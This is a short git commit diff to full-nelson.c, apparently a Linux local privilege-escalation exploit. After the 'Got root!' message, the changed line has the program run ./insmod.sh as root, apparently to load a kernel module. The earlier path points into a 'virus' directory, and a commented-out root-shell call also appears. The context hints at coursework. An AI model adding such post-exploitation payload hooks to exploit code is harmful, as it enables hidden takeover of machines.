73686c6d9e032b0dd84a4552730a15fa15b76cd2
yangbo <942190897@qq.com>
2017-12-24 10:33:05 +0800

    modify

--- full-nelson.c
+++ full-nelson.c
@@ -272,6 +272,6 @@ int main(int argc, char * argv[])
 
        printf("[*] Got root!\n");
        //execl("/bin/sh", "/bin/sh", NULL);
-system ("/home/oslab/OSlab/virus/insmod.sh");
+system ("./insmod.sh");
 }
 
